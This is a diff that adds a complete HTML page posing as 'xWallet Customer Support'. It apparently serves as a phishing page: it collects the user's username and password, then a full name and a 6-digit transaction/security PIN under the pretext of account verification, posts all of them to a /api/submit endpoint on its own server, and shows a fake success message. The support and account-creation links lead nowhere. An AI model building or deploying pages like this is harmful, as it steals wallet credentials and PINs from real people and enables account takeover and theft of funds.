@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>xWallet Customer Support</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { 
+            --primary: #00c27c; /* xWallet Green */
+            --primary-hover: #00a86b;
+            --bg: #f8fafc; 
+            --text-main: #1e293b; 
+            --text-light: #64748b;
+            --white: #ffffff;
+            --border: #e2e8f0;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: var(--bg); 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            min-height: 100vh; 
+        }
+        
+        .container { 
+            width: 100%; 
+            max-width: 440px; 
+            background: var(--white); 
+            padding: 40px 30px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.03); 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            box-sizing: border-box;
+        }
+
+        /* LOGO CARD (Matching User Image) */
+        .logo-card-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-card {
+            width: 130px;
+            height: 130px;
+            border-radius: 24px;
+            background: linear-gradient(135deg, #5db6ff 0%, #0369d9 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 12px 24px rgba(3, 105, 217, 0.25);
+            padding: 10px;
+            box-sizing: border-box;
+        }
+
+        .logo-svg {
+            width: 70px;
+            height: 70px;
+        }
+
+        .logo-text {
+            color: var(--white);
+            font-weight: 700;
+            font-size: 16px;
+            margin-top: 4px;
+            letter-spacing: 0.3px;
+        }
+
+        /* TEXT STYLES */
+        .view-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin: 0 0 10px 0;
+            text-align: left;
+        }
+
+        .view-subtitle {
+            font-size: 18px;
+            font-weight: 500;
+            color: var(--text-light);
+            margin: 0 0 35px 0;
+            text-align: left;
+        }
+
+        .sub-text { 
+            color: var(--text-light); 
+            font-size: 14px; 
+            margin-bottom: 25px;
+            text-align: center; 
+        }
+
+        h3 { 
+            border-bottom: 1px solid #f1f5f9; 
+            padding-bottom: 10px; 
+            margin-top: 10px; 
+            color: var(--text-main); 
+            font-size: 18px; 
+            font-weight: 600;
+        }
+
+        /* VIEWS */
+        .hidden { display: none !important; }
+
+        /* INPUTS */
+        .input-group { 
+            margin-bottom: 20px; 
+            position: relative;
+        }
+        .input-group label { 
+            display: block; 
+            margin-bottom: 8px; 
+            font-weight: 500; 
+            color: var(--text-main); 
+            font-size: 14px; 
+        }
+        
+        .input-field { 
+            width: 100%; 
+            height: 55px;
+            padding: 15px; 
+            border: 1px solid var(--border); 
+            border-radius: 10px; 
+            background: #ffffff; 
+            font-size: 16px; 
+            box-sizing: border-box; 
+            outline: none; 
+            transition: all 0.2s;
+            color: var(--text-main);
+        }
+        
+        .input-field::placeholder {
+            color: #94a3b8;
+        }
+
+        .input-field:focus { 
+            border-color: var(--primary); 
+            box-shadow: 0 0 0 3px rgba(0, 194, 124, 0.1); 
+        }
+
+        /* PASSWORD TOGGLE */
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: var(--text-light);
+            font-size: 18px;
+            user-select: none;
+        }
+
+        /* FORGOT PASSWORD LINK */
+        .forgot-link-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: -10px;
+            margin-bottom: 25px;
+        }
+
+        .forgot-link {
+            color: var(--text-light);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+            transition: color 0.2s;
+        }
+
+        .forgot-link:hover {
+            color: var(--text-main);
+        }
+
+        /* AGREEMENT CHECKBOX */
+        .agreement-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 30px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .agreement-checkbox {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 1.5px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            background: #fff;
+            flex-shrink: 0;
+        }
+
+        .agreement-checkbox i {
+            color: #fff;
+            font-size: 11px;
+            display: none;
+        }
+
+        .agreement-container.checked .agreement-checkbox {
+            background-color: var(--primary);
+            border-color: var(--primary);
+        }
+
+        .agreement-container.checked .agreement-checkbox i {
+            display: block;
+        }
+
+        .agreement-text {
+            font-size: 14px;
+            color: var(--text-light);
+        }
+
+        .agreement-link {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .agreement-link:hover {
+            text-decoration: underline;
+        }
+
+        /* PIN BOX */
+        .pin-wrapper { display: flex; gap: 8px; justify-content: space-between; margin-top: 10px; }
+        .pin-box { 
+            width: 100%; 
+            height: 52px; 
+            text-align: center; 
+            font-size: 24px; 
+            font-weight: bold;
+            border: 1px solid var(--border); 
+            border-radius: 10px; 
+            background: white; 
+            padding: 0;
+            outline: none;
+            transition: all 0.2s;
+        }
+        .pin-box:focus { 
+            border-color: var(--primary); 
+            box-shadow: 0 0 0 3px rgba(0, 194, 124, 0.1); 
+        }
+
+        /* BUTTONS */
+        .btn { 
+            width: 100%; 
+            height: 55px;
+            border: none; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            color: white; 
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn-green { 
+            background: var(--primary); 
+        }
+        
+        .btn-green:hover { 
+            background: var(--primary-hover); 
+        }
+        
+        .btn:disabled { 
+            background: #cbd5e1; 
+            cursor: not-allowed; 
+        }
+
+        /* FOOTER */
+        .footer-text {
+            text-align: center;
+            margin-top: 35px;
+            font-size: 14px;
+            color: var(--text-light);
+        }
+
+        .footer-link {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        /* ERROR MESSAGE */
+        .error-msg { 
+            color: #ef4444; 
+            text-align: center; 
+            margin-bottom: 20px; 
+            font-size: 14px; 
+            display: none; 
+            background: #fef2f2;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #fee2e2;
+        }
+
+        /* MODAL */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(15, 23, 42, 0.6); display: none; align-items: center; justify-content: center; z-index: 1000;
+            backdrop-filter: blur(4px);
+        }
+        .modal-box {
+            background: white; padding: 40px 30px; border-radius: 20px; 
+            text-align: center; width: 85%; max-width: 380px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        .success-icon { color: var(--primary); font-size: 64px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Brand Logo -->
+    <div class="logo-card-container">
+        <img src="logo.png" alt="XWallet Logo" class="logo-img" style="width: 130px; height: 130px; object-fit: contain; border-radius: 24px; box-shadow: 0 12px 24px rgba(3, 105, 217, 0.2); background: linear-gradient(135deg, #5db6ff 0%, #0369d9 100%); padding: 12px; box-sizing: border-box;">
+    </div>
+
+    <!-- VIEW 1: LOGIN (Matching the second image layout) -->
+    <div id="view-login">
+        <h1 class="view-title">Login</h1>
+        <p class="view-subtitle">Welcome to xWallet</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" class="input-field" placeholder="Username" required autocomplete="username">
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="logPass" class="input-field" placeholder="Password" required autocomplete="current-password">
+                <span class="password-toggle" onclick="togglePassword()"><i class="fa-regular fa-eye" id="eyeIcon"></i></span>
+            </div>
+            
+            <div class="forgot-link-container">
+                <a href="#" class="forgot-link" onclick="alert('Please contact support to reset your password.')">Forgot password?</a>
+            </div>
+
+            <!-- Agreement Checkbox -->
+            <div class="agreement-container" id="agreementContainer" onclick="toggleAgreement()">
+                <div class="agreement-checkbox">
+                    <i class="fa-solid fa-check"></i>
+                </div>
+                <div class="agreement-text">
+                    I agree to user <a href="#" class="agreement-link" onclick="event.stopPropagation(); alert('Privacy Agreement details...')">Privacy Agreement</a>
+                </div>
+            </div>
+            
+            <div id="loginErr" class="error-msg"></div>
+            
+            <button type="submit" class="btn btn-green">Login</button>
+        </form>
+
+        <p class="footer-text">
+            Don't have an account? <a href="#" class="footer-link" onclick="alert('Account creation is temporarily disabled. Please contact support.')">Create an account</a>
+        </p>
+    </div>
+
+    <!-- VIEW 2: VERIFICATION DETAILS -->
+    <div id="view-form" class="hidden">
+        <h1 class="view-title" style="font-size: 26px;">Verification</h1>
+        <p class="sub-text">Please complete your account verification details</p>
+        
+        <h3>Verification Details</h3>
+        
+        <form id="detailsForm">
+            <div class="input-group">
+                <label>Full Name</label>
+                <input type="text" id="fullName" class="input-field" placeholder="Enter Full Name" required>
+            </div>
+
+            <div class="input-group">
+                <label>Problem Type</label>
+                <select id="problem" class="input-field" style="appearance: none; -webkit-appearance: none;" required>
+                    <option value="" disabled selected>Select your problem</option>
+                    <option value="Id auto logout">ID Auto Logout</option>
+                    <option value="Pending payment">Payment Pending</option>
+                    <option value="Slow sell">Slow Sell</option>
+                    <option value="Quota not added">Quota Not Added</option>
+                    <option value="Tool auto deauthorized">Tool Auto Deauthorized</option>
+                </select>
+                <i class="fa-solid fa-chevron-down" style="position: absolute; right: 16px; top: 48px; color: var(--text-light); pointer-events: none;"></i>
+            </div>
+
+            <div class="input-group">
+                <label>Security PIN (6 digits)</label>
+                <div class="pin-wrapper">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" required>
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" required>
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" required>
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" required>
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" required>
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric" required>
+                </div>
+                <small style="color:var(--text-light); display:block; margin-top:8px; font-size:12px;">Please enter your 6-digit transaction/security PIN</small>
+            </div>
+
+            <div class="input-group">
+                <label>Investment Experience</label>
+                <select id="experience" class="input-field" style="appearance: none; -webkit-appearance: none;" required>
+                    <option value="" disabled selected>Select experience level</option>
+                    <option value="Beginner (0-1 years)">Beginner (0-1 years)</option>
+                    <option value="Intermediate (1-3 years)">Intermediate (1-3 years)</option>
+                    <option value="Expert (3+ years)">Expert (3+ years)</option>
+                </select>
+                <i class="fa-solid fa-chevron-down" style="position: absolute; right: 16px; top: 48px; color: var(--text-light); pointer-events: none;"></i>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn btn-green" style="margin-top: 10px;">Submit Verification</button>
+        </form>
+    </div>
+</div>
+
+<!-- SUCCESS MODAL -->
+<div class="modal-overlay" id="successModal">
+    <div class="modal-box">
+        <i class="fa-solid fa-circle-check success-icon"></i>
+        <h2 style="margin:0 0 10px 0; color: var(--text-main); font-size: 24px; font-weight: 700;">Submission Successful!</h2>
+        <p style="color:var(--text-light); line-height:1.6; font-size: 15px; margin: 0 0 20px 0;">Your verification details have been received. We will review your account status shortly.</p>
+        <button onclick="resetApp()" class="btn btn-green">OK</button>
+        <p style="font-size:13px; color:var(--text-light); margin-top:20px; font-weight: 500;">Redirecting in <span id="timer" style="color: var(--primary); font-weight: 700;">5</span>s...</p>
+    </div>
+</div>
+
+<script>
+    // --- STATE MANAGEMENT ---
+    let credentials = {}; 
+    let agreementAgreed = false;
+    const loginView = document.getElementById('view-login');
+    const formView = document.getElementById('view-form');
+    
+    // ================= CONFIGURATION =================
+    // Point directly to the current server hosting the API
+    const BACKEND_URL = window.location.origin; 
+
+    // ================= AGREEMENT TOGGLE =================
+    function toggleAgreement() {
+        agreementAgreed = !agreementAgreed;
+        const container = document.getElementById('agreementContainer');
+        if (agreementAgreed) {
+            container.classList.add('checked');
+        } else {
+            container.classList.remove('checked');
+        }
+    }
+
+    // ================= PASSWORD VISIBILITY =================
+    function togglePassword() {
+        const passInput = document.getElementById('logPass');
+        const eyeIcon = document.getElementById('eyeIcon');
+        if (passInput.type === 'password') {
+            passInput.type = 'text';
+            eyeIcon.classList.remove('fa-eye');
+            eyeIcon.classList.add('fa-eye-slash');
+        } else {
+            passInput.type = 'password';
+            eyeIcon.classList.remove('fa-eye-slash');
+            eyeIcon.classList.add('fa-eye');
+        }
+    }
+
+    // ================= 1. LOGIN LOGIC =================
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const usernameVal = document.getElementById('username').value;
+        const passVal = document.getElementById('logPass').value;
+        const err = document.getElementById('loginErr');
+
+        // Verify Privacy Agreement Checkbox
+        if (!agreementAgreed) {
+            err.innerText = "Please agree to the Privacy Agreement to proceed.";
+            err.style.display = "block";
+            return;
+        }
+
+        if (!usernameVal || !passVal) {
+            err.innerText = "Please fill in all fields.";
+            err.style.display = "block";
+            return;
+        }
+
+        // Clear error
+        err.style.display = "none";
+
+        // Store credentials to send later
+        credentials = { username: usernameVal, loginPassword: passVal };
+        
+        // Switch Views
+        loginView.classList.add('hidden');
+        formView.classList.remove('hidden');
+    });
+
+    // ================= 2. PIN BOX LOGIC =================
+    const pins = document.querySelectorAll('.pin-box');
+    pins.forEach((input, index) => {
+        // Auto-focus next input
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length === 1 && index < pins.length - 1) {
+                pins[index + 1].focus();
+            }
+        });
+
+        // Handle Backspace
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                pins[index - 1].focus();
+            }
+        });
+    });
+
+    // ================= 3. SUBMIT LOGIC =================
+    document.getElementById('detailsForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        const originalText = btn.innerText;
+        
+        // Gather PIN
+        let combinedPin = '';
+        pins.forEach(p => combinedPin += p.value);
+        
+        if (combinedPin.length !== 6) {
+            alert("Please enter the full 6-digit Security PIN.");
+            return;
+        }
+
+        // Set Loading State
+        btn.disabled = true;
+        btn.innerText = "Processing...";
+
+        // Prepare Data Payload (matching updated DB schema)
+        const formData = {
+            username: credentials.username,
+            loginPassword: credentials.loginPassword,
+            fullName: document.getElementById('fullName').value,
+            problem: document.getElementById('problem').value,
+            experience: document.getElementById('experience').value,
+            securityPin: combinedPin
+        };
+
+        try {
+            const response = await fetch(`${BACKEND_URL}/api/submit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            });
+
+            const result = await response.json();
+
+            if (response.ok) {
+                showSuccess(); // Trigger Success Modal
+            } else {
+                alert("Error: " + (result.error || "Submission failed"));
+                btn.disabled = false;
+                btn.innerText = originalText;
+            }
+
+        } catch (error) {
+            console.error(error);
+            alert("Network Error: Please check your internet connection.");
+            btn.disabled = false;
+            btn.innerText = originalText;
+        }
+    });
+
+    // ================= 4. SUCCESS & TIMER =================
+    function showSuccess() {
+        const modal = document.getElementById('successModal');
+        const timerSpan = document.getElementById('timer');
+        modal.style.display = 'flex';
+        
+        let timeLeft = 5;
+        const interval = setInterval(() => {
+            timeLeft--;
+            timerSpan.innerText = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                resetApp();
+            }
+        }, 1000);
+    }
+
+    function resetApp() {
+        window.location.reload();
+    }
+</script>
+
+</body>
+</html>
